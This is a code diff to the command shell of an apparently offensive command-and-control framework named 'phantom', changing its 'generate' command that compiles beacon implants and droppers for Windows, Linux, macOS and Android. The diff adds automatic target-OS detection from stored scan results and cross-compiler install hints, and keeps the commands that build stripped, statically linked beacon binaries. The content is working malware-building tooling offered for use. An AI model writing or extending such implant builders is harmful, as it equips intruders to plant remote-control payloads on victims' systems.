@@ -149,11 +149,26 @@ class C2Shell(cmd.Cmd):
             console.print(res["output"])
 
     def do_generate(self, arg):
-        """generate <windows|linux|macos|android> - Generate beacon and dropper for a target platform"""
+        """generate [windows|linux|macos|android] - Generate beacon and dropper for a target platform"""
         import os, subprocess, shutil
         from phantom.utils.network import get_lhost
+        from phantom.core.session import session
         
-        platform = arg.strip().lower() if arg.strip() else "windows"
+        # Try to guess platform if not provided
+        platform = arg.strip().lower()
+        if not platform:
+            # Check scan results for OS clues
+            scan_res = session.get_result("scan") or {}
+            all_text = str(scan_res).lower()
+            if "linux" in all_text or "unix" in all_text:
+                platform = "linux"
+                notifier.info("Detected Linux target from scan results. Defaulting to 'linux'.")
+            elif "windows" in all_text:
+                platform = "windows"
+                notifier.info("Detected Windows target from scan results. Defaulting to 'windows'.")
+            else:
+                platform = "windows" # Global default
+        
         valid_platforms = ["windows", "linux", "macos", "android"]
         if platform not in valid_platforms:
             notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
@@ -179,11 +194,13 @@ class C2Shell(cmd.Cmd):
                              "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
                             cwd=beacon_dir, check=True, capture_output=True, text=True)
                     else:
-                        if not shutil.which("x86_64-w64-mingw32-g++"):
-                            notifier.error("'x86_64-w64-mingw32-g++' not found. Install it for cross-compilation.")
+                        mingw_cpp = "x86_64-w64-mingw32-g++"
+                        if not shutil.which(mingw_cpp):
+                            notifier.error(f"'{mingw_cpp}' not found. To build for Windows from Linux, run:")
+                            console.print(f"[bold cyan]    sudo apt update && sudo apt install -y mingw-w64[/]")
                             return
                         subprocess.run(
-                            ["x86_64-w64-mingw32-g++", "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
+                            [mingw_cpp, "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
                              "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
                             cwd=beacon_dir, check=True, capture_output=True, text=True)
                     notifier.success("Windows beacon compiled.")
@@ -204,7 +221,8 @@ class C2Shell(cmd.Cmd):
                 console.print("[yellow][*] Compiling beacon for Linux...[/yellow]")
                 try:
                     if not shutil.which("g++"):
-                        notifier.error("'g++' not found. Install build-essential, libcurl4-openssl-dev, and libssl-dev.")
+                        notifier.error("'g++' not found. Install build-essential, libcurl4-openssl-dev, and libssl-dev:")
+                        console.print("[bold cyan]    sudo apt update && sudo apt install -y build-essential libcurl4-openssl-dev libssl-dev[/]")
                         return
                     subprocess.run(
                         ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux", "src/main.cpp",
@@ -213,7 +231,6 @@ class C2Shell(cmd.Cmd):
                     notifier.success("Linux beacon compiled.")
                 except subprocess.CalledProcessError as e:
                     notifier.error(f"Compilation failed:\n{e.stderr}")
-                    console.print("[dim]Ensure g++, libcurl-dev, and libssl-dev are installed.[/dim]")
                     return
                 except Exception as e:
                     notifier.error(f"Unexpected error: {e}")
